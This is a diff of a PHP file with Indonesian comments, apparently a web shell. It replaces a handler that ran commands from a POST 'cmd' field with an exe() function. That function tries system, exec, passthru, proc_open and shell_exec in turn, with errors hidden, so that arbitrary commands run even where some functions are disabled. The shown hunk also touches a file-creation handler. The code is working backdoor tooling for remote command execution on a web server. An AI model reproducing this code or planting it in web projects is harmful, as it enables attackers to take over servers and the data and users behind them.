@@ -403,73 +403,67 @@
             }
         }
         // CMD sesuai dengan direktori di URL
-if (isset($_POST['cmd'])) {
-    $command = $_POST['cmd'];
-    $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
-    echo "<div class='mt-4'>";
+function exe($cmd) {
+    // Cek dan gunakan system()
+    if (function_exists('system')) {
+        @ob_start();
+        @system($cmd, $resultCode);
+        $output = @ob_get_contents();
+        @ob_end_clean();
+        if (!empty($output)) {
+            return $output;
+        }
+    }
 
-    $output = null;
-    $resultCode = null;
+    // Cek dan gunakan exec()
+    if (function_exists('exec')) {
+        @exec($cmd, $results, $resultCode);
+        if (!empty($results)) {
+            return implode("\n", $results);
+        }
+    }
 
-    chdir($path);
+    // Cek dan gunakan passthru()
+    if (function_exists('passthru')) {
+        @ob_start();
+        @passthru($cmd, $resultCode);
+        $output = @ob_get_contents();
+        @ob_end_clean();
+        if (!empty($output)) {
+            return $output;
+        }
+    }
 
-    // Try exec
-    exec($command, $execOutput, $execResultCode);
-    if (!empty($execOutput)) {
-        $output = implode("\n", $execOutput);
-        $resultCode = $execResultCode;
-    } else {
-        // Try system
-        ob_start();
-        $systemOutput = system($command, $systemResultCode);
-        ob_end_clean();
-        if (!empty($systemOutput)) {
-            $output = $systemOutput;
-            $resultCode = $systemResultCode;
-        } else {
-            // Try passthru
-            ob_start();
-            passthru($command, $passthruResultCode);
-            $passthruOutput = ob_get_clean();
-            if (!empty($passthruOutput)) {
-                $output = $passthruOutput;
-                $resultCode = $passthruResultCode;
-            } else {
-                // Try proc_open as a last resort
-                $descriptorspec = [
-                    0 => ["pipe", "r"],
-                    1 => ["pipe", "w"],
-                    2 => ["pipe", "w"]
-                ];
-                $process = proc_open($command, $descriptorspec, $pipes);
-                if (is_resource($process)) {
-                    fclose($pipes[0]);
-                    $procOutput = stream_get_contents($pipes[1]);
-                    $procError = stream_get_contents($pipes[2]);
-                    fclose($pipes[1]);
-                    fclose($pipes[2]);
-                    $returnValue = proc_close($process);
-
-                    if (!empty($procOutput) || !empty($procError)) {
-                        $output = $procOutput ? $procOutput : $procError;
-                        $resultCode = $returnValue;
-                    }
-                }
+    // Cek dan gunakan proc_open()
+    if (function_exists('proc_open')) {
+        $descriptorspec = [
+            0 => ["pipe", "r"],  // stdin
+            1 => ["pipe", "w"],  // stdout
+            2 => ["pipe", "w"]   // stderr
+        ];
+        $process = @proc_open($cmd, $descriptorspec, $pipes);
+        if (is_resource($process)) {
+            $output = @stream_get_contents($pipes[1]);
+            @fclose($pipes[0]);
+            @fclose($pipes[1]);
+            @fclose($pipes[2]);
+            @proc_close($process);
+            if (!empty($output)) {
+                return $output;
             }
         }
     }
 
-    // Output result
-    if ($output !== null) {
-        echo "<pre>Result Code: $resultCode</pre>";
-        echo "<pre>$output</pre>";
-        echo "</div>";
-        return; // Stop execution after the first successful command
+    // Cek dan gunakan shell_exec()
+    if (function_exists('shell_exec')) {
+        $output = @shell_exec($cmd);
+        if (!empty($output)) {
+            return $output;
+        }
     }
 
-    // Fallback if no method succeeded
-    echo "<pre>No output generated.</pre>";
-    echo "</div>";
+    // Jika tidak ada metode yang berhasil, kembalikan pesan error
+    return "Command execution failed or no output generated.";
 }
         // Create a new file
         if (isset($_POST['createFile'])) {
